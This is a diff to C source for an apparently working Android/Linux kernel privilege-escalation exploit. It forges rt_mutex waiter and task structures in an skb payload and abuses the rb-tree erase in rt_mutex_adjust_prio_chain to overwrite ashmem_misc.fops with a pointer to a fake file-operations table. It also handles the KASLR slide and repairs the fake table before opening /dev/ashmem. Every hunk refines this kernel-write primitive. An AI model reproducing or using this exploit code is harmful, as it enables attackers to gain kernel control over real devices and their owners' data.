@@ -527,10 +527,19 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_lock = payload_base + LOCK_OFF;
   fake_w0 = payload_base + W0_OFF;
   fake_task = payload_base + FAKE_TASK_OFF;
-  /* FOPS_AT_WRITE: the chain[11] walk empirically writes (page+0x319) =
-   * (fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF)|1 into *(ashmem_misc.fops),
-   * NOT write_pc.  Put the real fops table exactly there (built by the
-   * pre-CFI repair, after the walk has rearranged W0's pi_tree). */
+  /* Mode-4 write value, DERIVED from ROM 4.14 (not fitted to an observation):
+   * rt_mutex_adjust_prio_chain() [11] dequeues a waiter's pi_tree_entry with
+   * rb_erase_cached() -> __rb_erase_augmented() case 1 does
+   *     child->__rb_parent_color = node->__rb_parent_color;   (child = node->rb_right)
+   * i.e. the value written is the erased node's OWN parent_color.  The erased
+   * node is either
+   *   (a) W0->pi_tree_entry           -> its parent_color == write_pc, which we
+   *       set to fake_fops in the mode-4 block below, OR
+   *   (b) the waiter's pi_tree_entry  -> its parent_color is assigned by
+   *       rt_mutex_enqueue_pi() to fake_task->pi_waiters.rb_root.rb_node
+   *       = (fake_w0 + PI_TREE_ENTRY_OFF)  (see the pi_waiters block below).
+   * Both yield the SAME value (fake_w0 + PI_TREE_ENTRY_OFF)|1, so that is
+   * fake_fops and the fops table must live at that page offset. */
   fake_fops = payload_base + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 1;
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     if (pselect_custom_write) {
@@ -592,15 +601,13 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uint64_t pi_top_task = env_flag("SSOPT_FAKE_TASK", 0) ? fake_task
                                                         : data_addr(INIT_TASK);
   if (pselect_custom_write == 4) {
-    /* Mode 4 fops redirect: W0's pi_tree drives the write.
-     * pi_parent = fake_fops (parent for rb_set_parent)
-     * pi_right = ASHMEM_MISC_FOPS (child that gets rb_set_parent called on it)
-     * rb_set_parent(child=MISC_FOPS, parent=fake_fops) writes fake_fops|color to *MISC_FOPS */
-    { /* diagnostic: allow overriding the value written by mode-4 */
-      const char *wpt = getenv("WRITE_PC_TEST");
-      write_pc = (wpt && *wpt) ? strtoull(wpt, NULL, 0)
-                               : payload_base + FOPS_TABLE_OFF;  /* dummy node */
-    }
+    /* Mode 4 fops redirect.  Per __rb_erase_augmented() case 1 the erased
+     * node's rb_right (child) receives the node's own __rb_parent_color:
+     *     *(node->rb_right) = node->__rb_parent_color
+     * So set the W0 pi-tree node's parent_color (write_pc) = fake_fops and its
+     * rb_right = &ashmem_misc.fops, rb_left = 0 (so rb_erase takes case 1). */
+    const char *wpt = getenv("WRITE_PC_TEST");
+    write_pc = (wpt && *wpt) ? strtoull(wpt, NULL, 0) : fake_fops;
     write_right = (kaslr_slide != 0) ? canon_addr(ASHMEM_MISC_FOPS)
                                      : data_addr(ASHMEM_MISC_FOPS);
     if (env_flag("WRITE4_SCRATCH", 0))
@@ -897,7 +904,8 @@ static unsigned char *perf_page_map;
 /* Rewrite the fake fops table inside our page (MAP_SHARED) after the walk.
  * The rb-tree PI write clobbers slots of the table (llseek at least, observed
  * owner too), and misc_open() reads c->fops->owner right away -> rewrite the
- * whole table with the correct (slid) pointers before opening /dev/ashmem. */
+ * whole table with the correct (slid) pointers before opening /dev/ashmem.
+ * poff is fake_fops's page offset ( = (fake_w0+PI_TREE_ENTRY_OFF+1) - LOCK_OFF ). */
 void ssopt_repair_fake_fops_page(void) {
   if (!perf_page_map || !fake_fops) return;
   size_t poff = (size_t)((W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 1) - LOCK_OFF); /* fake_fops page off */
